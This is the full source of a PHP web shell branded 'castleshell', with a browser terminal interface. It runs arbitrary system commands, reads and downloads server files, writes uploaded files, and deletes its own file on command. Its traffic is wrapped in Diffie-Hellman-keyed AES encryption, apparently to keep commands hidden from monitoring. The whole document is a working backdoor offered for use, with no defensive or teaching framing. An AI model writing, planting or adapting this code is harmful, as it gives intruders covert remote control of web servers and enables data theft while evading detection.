<?php

session_start();
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    init_session();
}
$cipher = "AES-256-CBC";
/*
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);*/

function init_session() {

    session_destroy();
    session_start();
    $configargs = array();
    $configargs['p'] = hex2bin('00a3251e733f44b92beef49d9f376a4bfd1dbdf4afdac810775941c65f73d2882939cd1c5fc39f0f22d29c20c1e4c01803b8b6d8daad3b39a6da8efe1230e9035d22baef18d27b69f95bcb78c60c8c6bf24992c249e0457772b3553630f2401789185003fa2d547a7f344c7332b688145114be805795e6a3f651ff17474f15d60e6c4753722c2a4c21cb7df34997c9475e40337b99527e7af3522780de1b266b40bb14110bfbe6d82fcfa0062f96b91c0bb4cbd3a6629c4867f681f2c6ff45030a9d679dce27d96b485dcafbc25d849b8bcb40c7a40c8a6ef4abbab610c3b8254dcf6096f4dbe8001c58477afb5186d122d74e94317ad5da3d53dedabb648d626b');
    $configargs['g'] = hex2bin('02');

    $private_key = openssl_pkey_new(array('dh' => $configargs));
    $details = openssl_pkey_get_details($private_key);

    $_SESSION["p"] = base64_encode($configargs['p']);
    $_SESSION["g"] = base64_encode($configargs['g']);
    
    $_SESSION["b"] = base64_encode($details['dh']['priv_key']);
    $_SESSION["b_pub"] = base64_encode($details['dh']['pub_key']);
}

function setSharedKey($remote_public_key)
{
    $configargs = array();
    $configargs['p'] = base64_decode($_SESSION["p"]);
    $configargs['g'] = base64_decode($_SESSION["g"]);
    $configargs['pub_key'] = base64_decode($_SESSION["b_pub"]);
    $configargs['priv_key'] = base64_decode($_SESSION["b"]);
    $private_key = openssl_pkey_new(array('dh' => $configargs));
    $_SESSION["s"] = base64_encode(hex2bin(hash('sha256', bin2hex(openssl_dh_compute_key($remote_public_key, $private_key)))));
}

function encryptData($keyhex, $array) {
    $plaintext = json_encode($array);
    $key = base64_decode($keyhex);
    $ivlen = openssl_cipher_iv_length("AES-256-CBC");
    $iv = openssl_random_pseudo_bytes($ivlen);
    $ciphertext = openssl_encrypt($plaintext, "AES-256-CBC", $key, $options=OPENSSL_RAW_DATA, $iv);
    return array(
        'ciphertext' => base64_encode($ciphertext),
        'iv' => base64_encode($iv)
    );
}
function decryptData($keyhex, $ciphertexthex, $ivhex) {

    $key = base64_decode($keyhex);
    $iv = base64_decode($ivhex);
    $ciphertext = base64_decode($ciphertexthex);
    $plaintext = openssl_decrypt($ciphertext, "AES-256-CBC", $key, $options=OPENSSL_RAW_DATA, $iv);
    $data = json_decode($plaintext, true);
    return $data;
}

if(isset($_POST['a_pub']))
{
    $_SESSION["a_pub"] = $_POST['a_pub'];
    setSharedKey(base64_decode($_POST['a_pub']));
    header("Content-Type: application/json");
    echo json_encode(array(
        "success" => "True"
    ));
    die();
}

function featurePrompt($cwd) {


    $shortCwd = $cwd;
    if (sizeof(explode("/", $cwd)) > 3) {
        $splittedCwd = explode("/", $cwd);
        $i = count($splittedCwd) - 2;
        $j = count($splittedCwd) - 1;

        $shortCwd = $cwd;#"…/".$splittedCwd[1]."/" + $splittedCwd[2];
    }
    $hostname = gethostname();
    $username = exec('whoami');
    $promptIcon = "$";
    if($username == "root"){
        $promptIcon = "#";
    }
    return array(
        'prompt' => $username . "@" . $hostname . "<span title=\":\" style=\"color: #fff\">:</span><span title=\"" . $cwd . "\">" . $shortCwd . "</span><span title=\"" . $promptIcon . "\" style=\"color: #fff\">" . $promptIcon . "</span>",
    );
}

function featureShell($cmd, $cwd) {
    $stdout = array();

    if (preg_match("/^\s*cd\s*$/", $cmd)) {
        // pass
    } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        chdir($match[1]);
    } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        return featureDownload($match[1]);
    } else {
        chdir($cwd);
        exec($cmd, $stdout);
    }

    return array(
        "stdout" => $stdout,
        "cwd" => getcwd(),
        "prompt" => featurePrompt(getcwd())["prompt"]
    );
}


function featurePwd() {
    return array("cwd" => getcwd());
}
function featureDestroy() {
    session_destroy();
    unlink(__FILE__);
    return array("done" => 1);
}


function featureHint($fileName, $cwd, $type) {

    chdir($cwd);
    if ($type == 'cmd') {
        $cmd = "compgen -c $fileName";
    } else {
        $cmd = "compgen -f $fileName";
    }
    $cmd = "/bin/bash -c \"$cmd\"";
    $files = explode("\n", shell_exec($cmd));
    return array(
        'files' => $files,
    );
}

function featureDownload($filePath) {
    $file = @file_get_contents($filePath);
    if ($file === FALSE) {
        return array(
            'stdout' => array('File not found / no read permission.'),
            'cwd' => getcwd()
        );
    } else {
        return array(
            'name' => basename($filePath),
            'file' => base64_encode($file)
        );
    }
}

function featureUpload($path, $file, $cwd) {
    chdir($cwd);
    $f = @fopen($path, 'wb');
    if ($f === FALSE) {
        return array(
            'stdout' => array('Invalid path / no write permission.'),
            'cwd' => getcwd()
        );
    } else {
        fwrite($f, base64_decode($file));
        fclose($f);
        return array(
            'stdout' => array('Done.'),
            'cwd' => getcwd()
        );
    }
}



if(isset($_POST['c']))
{
    $argumets = decryptData($_SESSION["s"], $_POST['c'], $_POST['iv']);
    if (isset($argumets["feature"])) {

        $response = NULL;
        switch ($argumets["feature"]) {
            case "shell":
                $cmd = $argumets['arguments']['cmd'];
                if (!preg_match('/2>/', $cmd)) {
                    $cmd .= ' 2>&1';
                }
                $response = featureShell($cmd, $argumets['arguments']["cwd"]);
                break;
            case "pwd":
                $response = featurePwd();
                break;
            case "prompt":
                $response = featurePrompt(getcwd());
                break;
            case "destroy":
                $response = featureDestroy();
                break;
            case "hint":
                $response = featureHint($argumets['arguments']['filename'], $argumets['arguments']['cwd'], $argumets['arguments']['type']);
                break;
            case 'upload':
                $response = featureUpload($argumets['arguments']['path'], $argumets['arguments']['file'], $argumets['arguments']['cwd']);
        }
        
    
        header("Content-Type: application/json");
        $e = encryptData($_SESSION["s"], $response);
        echo json_encode($e);
        die();
    }
}
// Kill in case of a broken post requests 
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    die();
}

?>
<!DOCTYPE html>

<html>

    <head>
        <meta charset="UTF-8" />
        <title>crypto@shell:~#</title>
        <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.0.0/crypto-js.js"></script>
        <script src="https://peterolson.github.io/BigInteger.js/BigInteger.min.js"></script>

        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <style>
            html, body {
                margin: 0;
                padding: 0;
                background: #191919;
                color: #eee;
                font-family: monospace;
            }

            #shell {
                background: #141414;
                max-width: 800px;
                margin: 50px auto 0 auto;
                box-shadow: 0 0 10px rgba(0, 0, 0, .4);
                font-size: 10pt;
                display: flex;
                flex-direction: column;
                align-items: stretch;
            }

            #shell-content {
                height: 500px;
                overflow: auto;
                padding: 5px;
                white-space: pre-wrap;
                flex-grow: 1;
            }

            #shell-logo {
                font-weight: bold;
                color: #f9c220;
                text-align: center;
            }

            @media (max-width: 991px) {
                #shell-logo {
                    display: none;
                }

                html, body, #shell {
                    height: 100%;
                    width: 100%;
                    max-width: none;
                }

                #shell {
                    margin-top: 0;
                }
            }

            @media (max-width: 767px) {
                #shell-input {
                    flex-direction: column;
                }
            }

            .shell-prompt {
                font-weight: bold;
                color: #f9c220;
            }

            .shell-prompt > span {
                color: #1bdce7;
            }

            #shell-input {
                display: flex;
                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);
                border-top: rgba(255, 255, 255, .05) solid 1px;
            }

            #shell-input > label {
                flex-grow: 0;
                display: block;
                padding: 0 5px;
                height: 30px;
                line-height: 30px;
            }

            #shell-input #shell-cmd {
                height: 30px;
                line-height: 30px;
                border: none;
                background: transparent;
                color: #eee;
                font-family: monospace;
                font-size: 10pt;
                width: 100%;
                align-self: center;
            }

            #shell-input div {
                flex-grow: 1;
                align-items: stretch;
            }

            #shell-input input {
                outline: none;
            }
        </style>

        <script>
            var g = bigInt("<?php echo bin2hex(base64_decode($_SESSION["g"])); ?>",16);
            var p = bigInt("<?php echo bin2hex(base64_decode($_SESSION["p"])); ?>",16);
            var b_pub = bigInt("<?php echo bin2hex(base64_decode($_SESSION["b_pub"])); ?>",16);
            var a = bigInt.randBetween(2,p);
            var a_pub = g.modPow(a, p);
            var s = CryptoJS.SHA256(b_pub.modPow(a, p).toString(16)).toString(CryptoJS.enc.Base64);
            var CWD = null;
            var PROMPT = null;
            var commandHistory = [];
            var historyPosition = 0;
            var eShellCmdInput = null;
            var eShellContent = null;

            function encryptData(keyhex, array){
                var key = CryptoJS.enc.Base64.parse(keyhex);
                var iv = CryptoJS.lib.WordArray.random(16);
                var plaintext = JSON.stringify(array);
                var encrypt = CryptoJS.AES.encrypt(plaintext, key, {
                    iv: iv,
                    mode: CryptoJS.mode.CBC,
                    padding: CryptoJS.pad.Pkcs7
                });
                return {
                    ciphertext: encrypt.ciphertext.toString(CryptoJS.enc.Base64),
                    iv: encrypt.iv.toString(CryptoJS.enc.Base64)
                    };
            }
            function decryptData(keyhex, ciphertexthex, ivhex){
                
                var key = CryptoJS.enc.Base64.parse(keyhex);
                var iv = CryptoJS.enc.Base64.parse(ivhex);
                var ciphertext = ciphertexthex;
                var decrypt = CryptoJS.AES.decrypt(ciphertext, key, {
                    iv: iv,
                    mode: CryptoJS.mode.CBC,
                    padding: CryptoJS.pad.Pkcs7
                });
                return JSON.parse(decrypt.toString(CryptoJS.enc.Utf8));
            }
            
            function _insertCommand(command) {
                eShellContent.innerHTML += "\n\n";
                eShellContent.innerHTML += '<span class=\"shell-prompt\">' + PROMPT + '</span> ';
                eShellContent.innerHTML += escapeHtml(command);
                eShellContent.innerHTML += "\n";
                eShellContent.scrollTop = eShellContent.scrollHeight;
            }

            function _insertStdout(stdout) {
                eShellContent.innerHTML += escapeHtml(stdout);
                eShellContent.scrollTop = eShellContent.scrollHeight;
            }

            function makeEncryptedRequest(params, callback) {
                var e = encryptData(s, params);
                makeRequest({c: e.ciphertext, iv: e.iv}, function (response) {
                    var resp = decryptData(s, response.ciphertext, response.iv);
                    callback(resp);
                });
            }
            function initShell(){
                makeRequest({a_pub: hexToBase64(a_pub.toString(16))}, function (response) {
                    console.log(response)
                });
            }

            function hexToBase64(str) {
                return btoa(String.fromCharCode.apply(null,
                    str.replace(/\r|\n/g, "").replace(/([\da-fA-F]{2}) ?/g, "0x$1 ").replace(/ +$/, "").split(" "))
                );
            }
            function featureShell(command) {

                _insertCommand(command);
                if (/^\s*upload\s+[^\s]+\s*$/.test(command)) {
                    featureUpload(command.match(/^\s*upload\s+([^\s]+)\s*$/)[1]);
                } else if (/^\s*clear\s*$/.test(command)) {
                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
                    eShellContent.innerHTML = '';
                } else if (/^\s*destroy\s*$/.test(command)) {
                    featureDestroy();  
                } else {
                    makeEncryptedRequest({feature: 'shell', arguments: {cmd: command, cwd: CWD}}, function (response) {
                        if (response.hasOwnProperty('file')) {
                            featureDownload(response.name, response.file)
                        } else {
                            _insertStdout(response.stdout.join("\n"));
                            updateCwd(response.cwd);
                            console.log(response.prompt)
                            _updatePrompt(response.prompt)
                        }
                    });
                }
            }

            function featureDestroy() {
                var ask = confirm("Destroy the current session (including the PHP file)?");
                if(ask){
                    makeEncryptedRequest({feature: 'destroy', arguments: {}}, function (response) {
                    return null;
                });
                }
                
            }

            function featureHint() {
                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete

                function _requestCallback(data) {
                    if (data.files.length <= 1) return;  // no completion

                    if (data.files.length === 2) {
                        if (type === 'cmd') {
                            eShellCmdInput.value = data.files[0];
                        } else {
                            var currentValue = eShellCmdInput.value;
                            eShellCmdInput.value = currentValue.replace(/([^\s]*)$/, data.files[0]);
                        }
                    } else {
                        _insertCommand(eShellCmdInput.value);
                        _insertStdout(data.files.join("\n"));
                    }
                }

                var currentCmd = eShellCmdInput.value.split(" ");
                var type = (currentCmd.length === 1) ? "cmd" : "file";
                var fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];

                makeEncryptedRequest({feature: 'hint', arguments: {
                        filename: fileName,
                        cwd: CWD,
                        type: type
                    }},
                    _requestCallback
                );

            }

            function featureDownload(name, file) {
                var element = document.createElement('a');
                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);
                element.setAttribute('download', name);
                element.style.display = 'none';
                document.body.appendChild(element);
                element.click();
                document.body.removeChild(element);
                _insertStdout('Done.');
            }

            function featureUpload(path) {
                var element = document.createElement('input');
                element.setAttribute('type', 'file');
                element.style.display = 'none';
                document.body.appendChild(element);
                element.addEventListener('change', function () {
                    var promise = getBase64(element.files[0]);
                    promise.then(function (file) {
                        makeEncryptedRequest({feature: 'upload', arguments: {path: path, file: file, cwd: CWD}}, function (response) {
                            _insertStdout(response.stdout.join("\n"));
                            updateCwd(response.cwd);
                        });
                    }, function () {
                        _insertStdout('An unknown client-side error occurred.');
                    });
                });
                element.click();
                document.body.removeChild(element);
            }

            function getBase64(file, onLoadCallback) {
                return new Promise(function(resolve, reject) {
                    var reader = new FileReader();
                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };
                    reader.onerror = reject;
                    reader.readAsDataURL(file);
                });
            }

            function genPrompt() {
                makeEncryptedRequest({feature: 'prompt', arguments: {cwd: CWD}}, function(response) {
                    _updatePrompt(response.prompt);
                });
            }

            function updateCwd(cwd) {
                if (cwd) {
                    CWD = cwd;
                    return;
                }
                makeEncryptedRequest({feature: 'pwd', arguments: {}}, function(response) {
                    CWD = response.cwd;
                });

            }

            function escapeHtml(string) {
                return string
                    .replace(/&/g, "&amp;")
                    .replace(/</g, "&lt;")
                    .replace(/>/g, "&gt;");
            }

            function _updatePrompt(prompt) {
                PROMPT = prompt;
                var eShellPrompt = document.getElementById("shell-prompt");
                eShellPrompt.innerHTML = prompt;
            }

            function _onShellCmdKeyDown(event) {
                switch (event.key) {
                    case "Enter":
                        featureShell(eShellCmdInput.value);
                        insertToHistory(eShellCmdInput.value);
                        eShellCmdInput.value = "";
                        break;
                    case "ArrowUp":
                        if (historyPosition > 0) {
                            historyPosition--;
                            eShellCmdInput.blur();
                            eShellCmdInput.focus();
                            eShellCmdInput.value = commandHistory[historyPosition];
                        }
                        break;
                    case "ArrowDown":
                        if (historyPosition >= commandHistory.length) {
                            break;
                        }
                        historyPosition++;
                        if (historyPosition === commandHistory.length) {
                            eShellCmdInput.value = "";
                        } else {
                            eShellCmdInput.blur();
                            eShellCmdInput.focus();
                            eShellCmdInput.value = commandHistory[historyPosition];
                        }
                        break;
                    case 'Tab':
                        event.preventDefault();
                        featureHint();
                        break;
                }
            }

            function insertToHistory(cmd) {
                commandHistory.push(cmd);
                historyPosition = commandHistory.length;
            }
            

            function makeRequest(params, callback) {
                function getQueryString() {
                    var a = [];
                    for (var key in params) {
                        if (params.hasOwnProperty(key)) {
                            a.push(encodeURIComponent(key) + "=" + encodeURIComponent(params[key]));
                        }
                    }
                    return a.join("&");
                }
                var xhr = new XMLHttpRequest();
                xhr.open("POST", window.location.href, true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4 && xhr.status === 200) {
                        try {
                            var responseJson = JSON.parse(xhr.responseText);
                            callback(responseJson);
                        } catch (error) {
                            
                            alert("Error while parsing response: " + error);
                        }
                    }
                };
                xhr.send(getQueryString());
            }

            window.onload = function() {
                initShell();
                eShellCmdInput = document.getElementById("shell-cmd");
                eShellContent = document.getElementById("shell-content");
                updateCwd();
                genPrompt();
                eShellCmdInput.focus();
            };
           
        </script>
    </head>

    <body>
        <div id="shell">
            <pre id="shell-content">
                <div id="shell-logo">
                            _   _           _          _ _  <span></span>
  _   |~  _                | | | |         | |        | | | <span></span>
 [_]--'--[_]   ___ __ _ ___| |_| | ___  ___| |__   ___| | | <span></span>
 |'|""`""|'|  / __/ _` / __| __| |/ _ \/ __| '_ \ / _ \ | | <span></span>
 | | /^\ | | | (_| (_| \__ \ |_| |  __/\__ \ | | |  __/ | | <span></span>
 |_|_|I|_|_|  \___\__,_|___/\__|_|\___||___/_| |_|\___|_|_| <span></span>
                                                            <span></span>                                            
                </div>
            </pre>
            <div id="shell-input">
                <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
                <div>
                    <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
                </div>
            </div>
        </div>
    </body>

</html>
